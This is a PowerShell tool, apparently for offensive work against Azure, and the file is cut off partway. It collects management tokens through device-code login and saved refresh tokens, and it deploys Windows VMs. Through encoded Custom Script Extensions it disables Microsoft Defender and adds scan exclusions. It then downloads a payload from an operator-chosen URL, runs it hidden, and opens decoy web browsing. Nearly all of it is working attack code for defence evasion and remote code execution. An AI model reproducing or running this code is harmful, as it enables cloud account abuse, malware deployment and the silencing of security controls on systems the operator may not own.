function Invoke-VMDeploy {
    param (
        [string]$ClientID,
        [string]$ClientSecret,
        [string]$IdentityARM,
        [string]$TenantName
    )

#######################################################################################################
#######################################################################################################
    $global:AuthMethod  = $null
    $global:CID = $null
    $global:CSecret = $null
    $global:TenantID  = $null
    $global:AccessToken = $null
    $global:RefreshTkn = $null

#######################################################################################################
#######################################################################################################

function Get-AuthHeaders {
    if (-not $global:AccessToken) { throw "[-] No AccessToken." }
    return @{
        "Authorization" = "Bearer $($global:AccessToken)"
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    }
}

#######################################################################################################

function Invoke-TokenRequest {
    param(
        [string]$Scope, 
        [string]$ClientID, 
        [string]$ClientSecret, 
        [string]$RefreshToken, 
        [string]$TenantID
    )

    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"

    if ($ClientID -and $ClientSecret) {

        $body = @{ 
            "grant_type" = "client_credentials"
             "scope" = $Scope
              "client_id" = $ClientID
              "client_secret" = $ClientSecret 
        }

    } elseif ($RefreshToken) {

        $body = @{ 
            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
             "scope" = $Scope
              "grant_type" = "refresh_token"
               "refresh_token" = $RefreshToken 
            }

    } else {
         return $null 
    }

    try {
        $resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"
        if ($resp.refresh_token) { $global:RefreshTkn = $resp.refresh_token; Set-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $resp.refresh_token }
        return $resp.access_token
    } catch { 
        return $null 
    }
}

#######################################################################################################

function Invoke-RenewToken {

    Write-Host "`t[!] Token expired - renewing ($($global:AuthMethod))..." -ForegroundColor Yellow

    switch ($global:AuthMethod) {

        "ClientCredentials" {
            $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -ClientID $global:CID -ClientSecret $global:CSecret -TenantID $global:TenantID

            if ($global:AccessToken) {
                 Write-Host "`t[+] Token renewed" -ForegroundColor Green
                 return $global:AccessToken 
            }
            throw "[-] Failed to renew."
        }

        "RefreshToken" {
            $rt = if (Test-Path "C:\Users\Public\RefreshToken.txt") {
                 Get-Content "C:\Users\Public\RefreshToken.txt" 
                } else {
                     $global:RefreshTkn 
                }

            $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -RefreshToken $rt -TenantID $global:TenantID

            if ($global:AccessToken) {
                 Write-Host "`t[+] Token renewed" -ForegroundColor Green
                 return $global:AccessToken 
            }

            throw "[-] Failed to renew."
        }

        "Manual" {
            Write-Host "`t[?] Paste new ARM AccessToken:" -ForegroundColor Cyan
            $t = Read-Host "`tARM Token"

            if ([string]::IsNullOrWhiteSpace($t)) {
                 throw "[-] No token." 
            }

            $global:AccessToken = $t.Trim()
            Write-Host "`t[+] Token updated. Resuming..." -ForegroundColor Green

            return $global:AccessToken
        }
        default { throw "[-] Unknown AuthMethod." }
    }
}

#######################################################################################################

function Invoke-SmartRequest {
    param (
        [string]$Method = "GET",
        [string]$Uri,
        [hashtable]$Headers = $null,
        $Body = $null,
        [string]$ContentType = $null,
        [int]$MaxRetries = 15
    )

    if (-not $Headers) {
         $Headers = Get-AuthHeaders 
    }

    $RetryCount = 0
    $TokenRenewed = $false
    $Success = $false
    $Response = $null

    while (-not $Success -and $RetryCount -lt $MaxRetries) {
        try {

            $p = @{ 
                Method = $Method
                Uri = $Uri
                Headers = $Headers 
            }

            if ($null -ne $Body) {
                 $p['Body'] = $Body 
            }
            
            if ($ContentType) {
                 $p['ContentType'] = $ContentType
            }

            $Response = Invoke-RestMethod @p
            $Success = $true

        } catch {
            $err = $_; $code = if ($err.Exception.Response) {
                 [int]$err.Exception.Response.StatusCode 
                } else {
                     $null 
                }

            if ($code -eq 429) {
                $RetryCount++
                $ra = $err.Exception.Response.Headers["Retry-After"]

                $wait = if (-not [string]::IsNullOrWhiteSpace($ra)) {
                     [int]($ra -join '') 
                } else {
                     10 * $RetryCount 
                }

                Write-Host "`t[!] 429 - waiting $wait sec" -ForegroundColor Gray; Start-Sleep -Seconds $wait
            }

            elseif ($code -eq 401) {

                if ($TokenRenewed) {
                     throw "[-] 401 after renewal." 
                }
                Invoke-RenewToken | Out-Null; $Headers["Authorization"] = "Bearer $($global:AccessToken)"; $TokenRenewed = $true
            }

            elseif ($code -eq 403) {
                 throw "FORBIDDEN:$Uri" 
            }

            elseif ($code -eq 404) {
                 return $null 
            }

            elseif ($code -eq 409) {

                $errBody = $null
                try { $errBody = $err.ErrorDetails.Message | ConvertFrom-Json } catch { }

                $errCode = if ($errBody -and $errBody.error) {
                     $errBody.error.code 
                } else {
                     ""
                }

                $errMsg  = if ($errBody -and $errBody.error) {
                     $errBody.error.message 
                } else {
                     "Unknown conflict" 
                }

                if ($errCode -match "SkuNotAvailable|NotAvailableForSubscription|ZonalAllocationFailed|AllocationFailed|OverconstrainedAllocationRequest|OperationNotAllowed") {
                    
                    throw "SKU_ERROR:$errMsg"
                }
                else {
                    
                    $RetryCount++
                    $wait = 15 * $RetryCount
                    Write-Host "`t[!] 409 Conflict - retrying in $wait sec ($RetryCount/$MaxRetries)" -ForegroundColor Yellow
                    Start-Sleep -Seconds $wait
                }
            }
            elseif ($null -eq $code -or $code -ge 500) {
                 $RetryCount++; Start-Sleep -Seconds (5 * $RetryCount) 
            }

            else {
                 throw $err 
            }
        }
    }

    if (-not $Success) {
         throw "[-] Failed after $MaxRetries retries: $Uri" 
    }

    return $Response
}

#######################################################################################################

function Get-DomainName {
    param (
        [string]$DomainName
    )

    try {
        $resp = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"

        $tid = ($resp.issuer -split "/")[3]; Write-Host "[#] Tenant ID: $tid" -ForegroundColor DarkYellow; return $tid

    } catch {
         Write-Error "[-] Failed to resolve: $DomainName"
          return $null 
    }
}

#######################################################################################################

function Invoke-GetTokens {

    param(
        [string]$DomainName, 
        [string]$ClientID, 
        [string]$ClientSecret,
        [string]$ARMToken
    )

    if ($ARMToken) {

        $global:AuthMethod = "Manual"
        $global:AccessToken = $ARMToken

        Write-Host "[+] ARM Token set (Manual)" -ForegroundColor Green
        return $global:AccessToken
    }
    if ($DomainName) {
         $global:TenantID = Get-DomainName -DomainName $DomainName; if (-not $global:TenantID) {
             return $null 
            } 
        }

    if ($ClientID -and $ClientSecret) {

        $global:AuthMethod = "ClientCredentials"
        $global:CID = $ClientID
        $global:CSecret = $ClientSecret

        $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $global:TenantID

        if ($global:AccessToken) {
             Write-Host "[+] Token acquired (ClientCredentials)" -ForegroundColor Green
             return $global:AccessToken 
        }

        return $null
    }


    $global:AuthMethod = "RefreshToken"
    $refreshPath = "C:\Users\Public\RefreshToken.txt"

    if (Test-Path $refreshPath) {
        Write-Host "[?] Found existing RefreshToken" -ForegroundColor DarkYellow
        $use = Read-Host "    Use it? (Y/N)"
        if ($use -match "^[Yy]") {
            $rt = Get-Content $refreshPath

            $global:AccessToken = Invoke-TokenRequest -Scope "https://management.azure.com/.default" -RefreshToken $rt -TenantID $global:TenantID

            if ($global:AccessToken) {
                 Write-Host "[+] Token acquired (RefreshToken)" -ForegroundColor Green 
                 return $global:AccessToken 
            }
            Write-Host "[!] RefreshToken failed, falling back..." -ForegroundColor Yellow
        }
    }

    $authResp = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body @{ "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"; "resource" = "https://management.azure.com" }
    Write-Host "`n[#] Enter this code:" -ForegroundColor DarkYellow -NoNewline; Write-Host " $($authResp.user_code)" -ForegroundColor White

    Start-Sleep -Seconds 5; Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

    $tokenBody = @{ "scope" = "openid"; "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"; "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"; "code" = $authResp.device_code }
    while ($true) {
        try {
            $tokenResp = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0" -Body $tokenBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
            if ($tokenResp.refresh_token) { Set-Content -Path $refreshPath -Value $tokenResp.refresh_token; $global:RefreshTkn = $tokenResp.refresh_token }
            $global:AccessToken = $tokenResp.access_token; Write-Host "[+] Token acquired (DeviceCode)" -ForegroundColor Green; return $global:AccessToken
        } catch {
            $er = $_.ErrorDetails.Message | ConvertFrom-Json
            if ($er.error -eq "authorization_pending") { Start-Sleep -Seconds 5 } else { Write-Host "[-] $($er.error)" -ForegroundColor Red; return $null }
        }
    }
}

#######################################################################################################

function GetIP {
    try { 
        $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 10).Trim(); return "$ip/32" 
    } catch {
         return $null 
    }
}

#######################################################################################################

function Test-OpAllowedMultiEntry {
    param(
        [array]$PermEntries,
        [string]$Operation,
        [string]$ActionType = "actions"
    )

    $denyType = if ($ActionType -eq "actions") { "notActions" } else { "notDataActions" }

    foreach ($entry in $PermEntries) {
        $allowed = @($entry.$ActionType)
        $denied  = @($entry.$denyType)

        $isAllowed = $false
        foreach ($a in $allowed) {
            if ($Operation -like $a) { $isAllowed = $true; break }
        }
        if (-not $isAllowed) { continue }

        $isDenied = $false
        foreach ($d in $denied) {
            if ($Operation -like $d) { $isDenied = $true; break }
        }

        if (-not $isDenied) { return $true }
    }
    return $false
}

#######################################################################################################
#######################################################################################################

function Get-SubscriptionPermLevel {
    param(
        [string]$SubscriptionId, 
        [hashtable]$Headers
    )

    $url = "https://management.azure.com/subscriptions/$SubscriptionId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"

    try { 
        $resp = Invoke-SmartRequest -Uri $url -Headers $Headers 
    } catch {
         return @{ Level = "ERROR"; CanCreateVM = $false } 
    }

    $allow = @()
    $deny = @()

    foreach ($p in $resp.value) {
         if ($p.actions) {
             $allow += $p.actions 
        };
         if ($p.notActions) {
             $deny += $p.notActions 
        } 
    }

    $allow = $allow | Select-Object -Unique; $deny = $deny | Select-Object -Unique

    $hasStar = Test-OpAllowedMultiEntry -Allowed $allow -Denied $deny -Operation '*'
    $canRBAC = Test-OpAllowedMultiEntry -Allowed $allow -Denied $deny -Operation 'Microsoft.Authorization/roleAssignments/write'
    $canVMWrite = Test-OpAllowedMultiEntry -Allowed $allow -Denied $deny -Operation 'Microsoft.Compute/virtualMachines/write'
    $canNetWrite = Test-OpAllowedMultiEntry -Allowed $allow -Denied $deny -Operation 'Microsoft.Network/virtualNetworks/write'

    $level = if ($canRBAC -and $hasStar) {
                "Owner" 
            }
            elseif ($hasStar) {
                 "Contributor" 
            }
            elseif ($canVMWrite) {
                 "VM Contributor" 
            }
            else {
                 "Limited" 
            }

    $canCreate = $hasStar -or ($canVMWrite -and $canNetWrite)

    return @{ 
        Level = $level
        CanCreateVM = $canCreate 
    }
}

#######################################################################################################

function Get-ResourceGroupPermLevel {
    param(
        [string]$SubscriptionId, 
        [string]$ResourceGroup, 
        [hashtable]$Headers
    )

    $url = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$ResourceGroup/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
    try {
         $resp = Invoke-SmartRequest -Uri $url -Headers $Headers 
        } 
    catch {
		Write-Host "      [DEBUG] Permission check failed: $_" -ForegroundColor Red
        return @{ Level = "No Access"; CanCreateVM = $false; NeedsExistingNet = $false } 
    }

    $entries = $resp.value
	Write-Host "      [DEBUG] Got $($entries.Count) permission entries" -ForegroundColor Magenta
	
    $hasStar  = Test-OpAllowedMultiEntry -PermEntries $entries -Operation '*'
    $canVMWrite = Test-OpAllowedMultiEntry -PermEntries $entries -Operation 'Microsoft.Compute/virtualMachines/write'
    $canNICWrite = Test-OpAllowedMultiEntry -PermEntries $entries -Operation 'Microsoft.Network/networkInterfaces/write'
    $canNetWrite = Test-OpAllowedMultiEntry -PermEntries $entries -Operation 'Microsoft.Network/virtualNetworks/write'
    $canNSGWrite = Test-OpAllowedMultiEntry -PermEntries $entries -Operation 'Microsoft.Network/networkSecurityGroups/write'
    $canPIPWrite = Test-OpAllowedMultiEntry -PermEntries $entries -Operation 'Microsoft.Network/publicIPAddresses/write'
    $canSubJoin = Test-OpAllowedMultiEntry -PermEntries $entries -Operation 'Microsoft.Network/virtualNetworks/subnets/join/action'
    $canNSGJoin = Test-OpAllowedMultiEntry -PermEntries $entries -Operation 'Microsoft.Network/networkSecurityGroups/join/action'
    $canRBAC= Test-OpAllowedMultiEntry -PermEntries $entries -Operation 'Microsoft.Authorization/roleAssignments/write'

    
    $canFullCreate = $hasStar -or ($canVMWrite -and $canNetWrite -and $canNSGWrite -and $canPIPWrite -and $canNICWrite)

    
    $canLimitedCreate = $canVMWrite -and $canNICWrite -and $canSubJoin

    $level = if ($canRBAC -and $hasStar) { "Owner" }
             elseif ($hasStar) { "Contributor" }
             elseif ($canVMWrite) { "VM Contributor" }
             else { "Limited" }

    return @{
        Level            = $level
        CanCreateVM      = ($canFullCreate -or $canLimitedCreate)
        NeedsExistingNet = (-not $canFullCreate -and $canLimitedCreate)
    }
}

#############################################################################################

function Find-ExistingNetworkResources {
    param(
        [string]$SubId, 
        [string]$RG, 
        [hashtable]$Headers
    )

    Write-Host "    [*] VM Contributor mode - looking for existing network resources..." -ForegroundColor Cyan

    # Find VNets in the RG
    $vnets = @()
    $vnetUri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Network/virtualNetworks?api-version=2023-11-01"
    try {
        $vnetResp = Invoke-SmartRequest -Uri $vnetUri -Headers $Headers
        if ($vnetResp -and $vnetResp.value) { $vnets = $vnetResp.value }
    } catch { }

    # Find NSGs in the RG
    $nsgs = @()
    $nsgUri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Network/networkSecurityGroups?api-version=2023-11-01"
    try {
        $nsgResp = Invoke-SmartRequest -Uri $nsgUri -Headers $Headers
        if ($nsgResp -and $nsgResp.value) { $nsgs = $nsgResp.value }
    } catch { }

    # Display and let user pick
    if ($vnets.Count -eq 0) {
        Write-Host "    [-] No existing VNets found in $RG. Cannot deploy." -ForegroundColor Red
        return $null
    }

    Write-Host "    [+] Available VNets:" -ForegroundColor Green
    for ($i = 0; $i -lt $vnets.Count; $i++) {
        $v = $vnets[$i]
        $subnets = $v.properties.subnets | ForEach-Object { $_.name }
        Write-Host "      $($i+1)) $($v.name) - subnets: $($subnets -join ', ')" -ForegroundColor White
    }

    $vChoice = Read-Host "    Select VNet #"
    $selectedVnet = $vnets[[int]$vChoice - 1]

    # Pick subnet
    $subnets = $selectedVnet.properties.subnets
    if ($subnets.Count -eq 1) {
        $selectedSubnet = $subnets[0]
        Write-Host "    [*] Using subnet: $($selectedSubnet.name)" -ForegroundColor DarkGray
    }
    else {
        Write-Host "    [+] Available Subnets:" -ForegroundColor Green
        for ($i = 0; $i -lt $subnets.Count; $i++) {
            Write-Host "      $($i+1)) $($subnets[$i].name) ($($subnets[$i].properties.addressPrefix))" -ForegroundColor White
        }
        $sChoice = Read-Host "    Select Subnet #"
        $selectedSubnet = $subnets[[int]$sChoice - 1]
    }

    # Pick NSG (optional)
    $selectedNsgId = $null
    if ($nsgs.Count -gt 0) {
        Write-Host "    [+] Available NSGs:" -ForegroundColor Green
        for ($i = 0; $i -lt $nsgs.Count; $i++) {
            Write-Host "      $($i+1)) $($nsgs[$i].name)" -ForegroundColor White
        }
        Write-Host "      0) None" -ForegroundColor DarkGray
        $nChoice = Read-Host "    Select NSG # (0 for none)"
        if ($nChoice -ne "0" -and $nChoice -ne "") {
            $selectedNsgId = $nsgs[[int]$nChoice - 1].id
        }
    }

    return @{
        SubnetId = $selectedSubnet.id
        NSGId    = $selectedNsgId
        Location = $selectedVnet.location
    }
}

#######################################################################################################
#######################################################################################################

$script:DefaultLocation = "eastus"

function Wait-Deployment {

    param(
        [string]$Uri, 
        [hashtable]$Headers, 
        [int]$TimeoutSec = 600
    )

    $start = Get-Date

    while (((Get-Date) - $start).TotalSeconds -lt $TimeoutSec) {
        try {
            $status = Invoke-SmartRequest -Uri $Uri -Headers $Headers
            $state = $status.properties.provisioningState

            if ($state -eq "Succeeded") {
                 return $true 
            }

            if ($state -eq "Failed") {
                 Write-Host "      [-] Provisioning failed" -ForegroundColor Red
                 return $false 
            }

        } catch {

         }

        Start-Sleep -Seconds 10
    }
    Write-Host "      [-] Timeout waiting for deployment" -ForegroundColor Red
    return $false
}


#######################################################################################################

function New-NSG {
    param(
        [string]$SubId, 
        [string]$RG, 
        [string]$Name, 
        [string]$Location, 
        [string]$MyIP, 
        [hashtable]$Headers
    )

    Write-Host "    [*] Creating NSG: $Name (RDP from $MyIP only)..." -ForegroundColor Cyan
    $uri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Network/networkSecurityGroups/$Name`?api-version=2023-11-01"
    $body = @{
        location = $Location
        properties = @{
            securityRules = @(
                @{
                    name = "Allow-RDP-Operator"
                    properties = @{
                        priority = 100
                        direction = "Inbound"
                        access = "Allow"
                        protocol = "Tcp"
                        sourceAddressPrefix = $MyIP
                        sourcePortRange = "*"
                        destinationAddressPrefix = "*"
                        destinationPortRange = "3389"
                    }
                },
                @{
                    name = "Deny-All-Inbound"
                    properties = @{
                        priority = 4096
                        direction = "Inbound"
                        access = "Deny"
                        protocol = "*"
                        sourceAddressPrefix = "*"
                        sourcePortRange = "*"
                        destinationAddressPrefix = "*"
                        destinationPortRange = "*"
                    }
                }
            )
        }
    } | ConvertTo-Json -Depth 10
    try {
        $resp = Invoke-SmartRequest -Method "PUT" -Uri $uri -Headers $Headers -Body $body -ContentType "application/json"
        Write-Host "    [+] NSG created" -ForegroundColor Green
        return $resp.id
    } catch {
		#Write-Host "    [-] NSG creation failed" -ForegroundColor Red
		return $null 
	}
}

#######################################################################################################

function New-VNet {
    param(
        [string]$SubId, 
        [string]$RG, 
        [string]$Name, 
        [string]$Location, 
        [string]$SubnetName, 
        [string]$NSGId, 
        [hashtable]$Headers
    )

    Write-Host "    [*] Creating VNet: $Name..." -ForegroundColor Cyan
    $uri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Network/virtualNetworks/$Name`?api-version=2023-11-01"
    $subnetConfig = @{
        name = $SubnetName
        properties = @{
            addressPrefix = "10.0.1.0/24"
        }
    }

    if ($NSGId) {
         $subnetConfig.properties["networkSecurityGroup"] = @{ id = $NSGId } 
    }

    $body = @{
        location = $Location
        properties = @{
            addressSpace = @{ addressPrefixes = @("10.0.0.0/16") }
            subnets = @($subnetConfig)
        }
    } | ConvertTo-Json -Depth 10
    try {
        $resp = Invoke-SmartRequest -Method "PUT" -Uri $uri -Headers $Headers -Body $body -ContentType "application/json"
        $subnetId = $resp.properties.subnets[0].id
        Write-Host "    [+] VNet created" -ForegroundColor Green
        return $subnetId
    } catch {
         #Write-Host "    [-] VNet creation failed: $_" -ForegroundColor Red
        return $null 
    }
}

#######################################################################################################

function New-PublicIP {
    param(
        [string]$SubId, 
        [string]$RG, 
        [string]$Name, 
        [string]$Location, 
        [hashtable]$Headers
    )

    $uri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Network/publicIPAddresses/$Name`?api-version=2023-11-01"

    $body = @{
        location = $Location
        sku = @{ name = "Standard" }
        properties = @{ publicIPAllocationMethod = "Static" }
    } | ConvertTo-Json -Depth 5

    try {
        $resp = Invoke-SmartRequest -Method "PUT" -Uri $uri -Headers $Headers -Body $body -ContentType "application/json"
        return $resp.id
    } catch {
         return $null 
    }
}

#######################################################################################################

function New-NIC {
    param(
        [string]$SubId, 
        [string]$RG, 
        [string]$Name, 
        [string]$Location, 
        [string]$SubnetId, 
        [string]$PIPId, 
        [string]$NSGId, 
        [hashtable]$Headers
    )

    $uri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Network/networkInterfaces/$Name`?api-version=2023-11-01"

    $ipConfig = @{
        name = "ipconfig1"
        properties = @{
            privateIPAllocationMethod = "Dynamic"
            subnet = @{ id = $SubnetId }
        }
    }
    if ($PIPId) { 
        $ipConfig.properties["publicIPAddress"] = @{ id = $PIPId } 
        }

    $nicProps = @{ ipConfigurations = @($ipConfig) }

    if ($NSGId) {
         $nicProps["networkSecurityGroup"] = @{ id = $NSGId } 
    }

    $body = @{ location = $Location; properties = $nicProps } | ConvertTo-Json -Depth 10

    try {
        $resp = Invoke-SmartRequest -Method "PUT" -Uri $uri -Headers $Headers -Body $body -ContentType "application/json"
        return $resp.id
    } catch {
         return $null 
    }
}

#######################################################################################################

function New-VM {
    param(
        [string]$SubId, 
        [string]$RG, 
        [string]$VMName, 
        [string]$Location, 
        [string]$NICId, 
        [string]$Username, 
        [string]$Password, 
        [string]$VMSize, 
        [hashtable]$Headers
    )

    Write-Host "    [*] Creating VM: $VMName ($VMSize)..." -ForegroundColor Cyan

    $uri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VMName`?api-version=2024-03-01"

    $body = @{
        location = $Location
        properties = @{
            hardwareProfile = @{ vmSize = $VMSize }
            osProfile = @{
                computerName = $VMName
                adminUsername = $Username
                adminPassword = $Password
            }
            storageProfile = @{
                imageReference = @{
                    publisher = "MicrosoftWindowsServer"
                    offer = "WindowsServer"
                    sku = "2022-datacenter-azure-edition"
                    version = "latest"
                }
                osDisk = @{
                    createOption = "FromImage"
                    managedDisk = @{ storageAccountType = "StandardSSD_LRS" }
                }
            }
            networkProfile = @{
                networkInterfaces = @(@{ id = $NICId; properties = @{ primary = $true } })
            }
        }
    } | ConvertTo-Json -Depth 15

    try {
        $resp = Invoke-SmartRequest -Method "PUT" -Uri $uri -Headers $Headers -Body $body -ContentType "application/json"
        Write-Host "    [+] VM deployment started" -ForegroundColor Green
        return $resp
    }
    catch {
        $errStr = $_.ToString()
        if ($errStr -match "^SKU_ERROR:(.+)") {
            $msg = $Matches[1]
            if ($msg -match "exceeding.*quota|Current Limit") {
                Write-Host "    [-] QUOTA EXCEEDED: Core limit reached in this region." -ForegroundColor Red
                # Extract useful info from error
                if ($msg -match "Current Limit: (\d+).*Current Usage: (\d+)") {
                    Write-Host "    [!] Cores: $($Matches[2])/$($Matches[1]) used" -ForegroundColor Yellow
                }
                return "QUOTA_EXCEEDED"
            }
            else {
                Write-Host "    [-] VM Size not available: $msg" -ForegroundColor Red
                Write-Host "    [!] Try a different VM size or location." -ForegroundColor Yellow
                return "SKU_ERROR"
            }
        } else {
            Write-Host "    [-] VM creation failed: $_" -ForegroundColor Red
        }
        return $null
    }
}

#######################################################################################################

function Get-VMPublicIP {
    param(
        [string]$SubId, 
        [string]$RG, 
        [string]$PIPName, 
        [hashtable]$Headers
    )

    $uri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Network/publicIPAddresses/$PIPName`?api-version=2023-11-01"

    try {
        $resp = Invoke-SmartRequest -Uri $uri -Headers $Headers
        return $resp.properties.ipAddress
    } catch {
         return "N/A" 
    }
}

#######################################################################################################
#######################################################################################################

function Install-Phase1-DisableDefender {
    param(
        [string]$SubId, 
        [string]$RG, 
        [string]$VMName, 
        [string]$Location, 
        [string]$PEFileName, 
        [hashtable]$Headers
    )

    Write-Host "      [*] Phase 1: Disabling Defender (registry) + restart..." -ForegroundColor Cyan

    $script = @'
$defPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (-not (Test-Path $defPath)) { New-Item -Path $defPath -Force | Out-Null }
New-ItemProperty -Path $defPath -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force | Out-Null
New-ItemProperty -Path $defPath -Name "DisableAntiVirus" -Value 1 -PropertyType DWORD -Force | Out-Null

$rtpPath = "$defPath\Real-Time Protection"
if (-not (Test-Path $rtpPath)) { New-Item -Path $rtpPath -Force | Out-Null }
New-ItemProperty -Path $rtpPath -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType DWORD -Force | Out-Null
New-ItemProperty -Path $rtpPath -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWORD -Force | Out-Null
New-ItemProperty -Path $rtpPath -Name "DisableOnAccessProtection" -Value 1 -PropertyType DWORD -Force | Out-Null
New-ItemProperty -Path $rtpPath -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWORD -Force | Out-Null
New-ItemProperty -Path $rtpPath -Name "DisableIOAVProtection" -Value 1 -PropertyType DWORD -Force | Out-Null

$spyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet"
if (-not (Test-Path $spyPath)) { New-Item -Path $spyPath -Force | Out-Null }
New-ItemProperty -Path $spyPath -Name "SpyNetReporting" -Value 0 -PropertyType DWORD -Force | Out-Null
New-ItemProperty -Path $spyPath -Name "SubmitSamplesConsent" -Value 2 -PropertyType DWORD -Force | Out-Null

$excPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
if (-not (Test-Path $excPath)) { New-Item -Path $excPath -Force | Out-Null }
New-ItemProperty -Path $excPath -Name "C:\" -Value 0 -PropertyType DWORD -Force | Out-Null

$excProc = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes"
if (-not (Test-Path $excProc)) { New-Item -Path $excProc -Force | Out-Null }
New-ItemProperty -Path $excProc -Name "{{PE_FILENAME}}" -Value 0 -PropertyType DWORD -Force | Out-Null

Start-Sleep -Seconds 3
Restart-Computer -Force
'@

    $script = $script.Replace('{{PE_FILENAME}}', $PEFileName)

    $bytes   = [System.Text.Encoding]::Unicode.GetBytes($script)
    $encoded = [Convert]::ToBase64String($bytes)

    $extUri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VMName/extensions/ART-Phase1`?api-version=2024-03-01"
    $body = @{
        location   = $Location
        properties = @{
            publisher = "Microsoft.Compute"
            type  = "CustomScriptExtension"
            typeHandlerVersion = "1.10"
            autoUpgradeMinorVersion = $true
            settings  = @{
                commandToExecute = "powershell -EncodedCommand $encoded"
            }
        }
    } | ConvertTo-Json -Depth 10

    try {
        $null = Invoke-SmartRequest -Method "PUT" -Uri $extUri -Headers $Headers -Body $body -ContentType "application/json"
        Write-Host "      [+] Defender disable applied. VM will restart." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "      [-] Phase 1 failed: $_" -ForegroundColor Red
        return $false
    }
}

#######################################################################################################

function Wait-VMReboot {
    param(
        [string]$SubId, 
        [string]$RG, 
        [string]$VMName, 
        [hashtable]$Headers, 
        [int]$TimeoutSec = 300
    )

    Write-Host "      [*] Waiting for VM to restart..." -ForegroundColor DarkGray

    $vmUri = "https://management.azure.com/subscriptions/$SubId/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VMName/instanceView`?api-version=2024-03-01"

    Start-Sleep -Seconds 30 

    $start = Get-Date
    while (((Get-Date) - $start).TotalSeconds -lt $TimeoutSec) {
        try {
            $view = Invoke-SmartRequest -Uri $vmUri -Headers $Headers
            $powerState = ($view.statuses | Where-Object { $_.code -match "PowerState" }).code
            if ($powerState -eq "PowerState/running") {
                
                $extStatus = $view.extensions | Where-Object { $_.name -eq "ART-Phase1" }
                if ($extStatus -and $extStatus.statuses[0].code -match "ProvisioningState/succeeded") {
                    Write-Host "      [+] VM is back online" -ForegroundColor Green
                    return $true
                }
            }
        } catch { }
        Start-Sleep -Seconds 15
    }
    Write-Host "      [!] Timeout waiting for VM reboot" -ForegroundColor Yellow
    return $false
}

#######################################################################################################

function Install-Phase2-DeployAgent {
    param(
        [string]$SubId, 
        [string]$RG, 
        [string]$VMName, 
        [string]$Location,
        [string]$PEUrl, 
        [string]$PEFileName, 
        [string]$PEArgs,
        [hashtable]$Headers
    )

    Write-Host "      [*] Phase 2: Downloading and executing agent on $VMName..." -ForegroundColor Cyan

    # Build download + execute script
    $script = @'
$outDir = "C:\Users\ART"
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir -Force | Out-Null }
$outPath = "$outDir\{{PE_FILENAME}}"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri "{{PE_URL}}" -OutFile $outPath -UseBasicParsing

Start-Sleep -Seconds 2
Start-Process -FilePath $outPath {{ARGS_BLOCK}} -WindowStyle Hidden

Start-Sleep -Seconds 5
Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/375.126/chrome_installer.exe" -OutFile "C:\Users\Public\chrome_installer.exe" -UseBasicParsing
Start-Process -FilePath "C:\Users\Public\chrome_installer.exe" -ArgumentList "/silent /install" -Wait
Start-Sleep -Seconds 10
Start-Process "chrome.exe" -ArgumentList "google.com","youtube.com","github.com","wikipedia.org","reddit.com","twitter.com","amazon.com","netflix.com","dailymail.co.uk","bbc.com"
'@

    $argsBlock = if ($PEArgs) { "-ArgumentList '$PEArgs'" } else { "" }

    $script = $script.Replace('{{PE_FILENAME}}', $PEFileName)
    $script = $script.Replace('{{PE_URL}}', $PEUrl)
    $script = $script.Replace('{{ARGS_BLOCK}}', $argsBlock)

    $bytes   = [System.Text.Encoding]::Unicode.GetBytes($script)
    $encoded = [Convert]::ToBase64String($bytes)

   
   
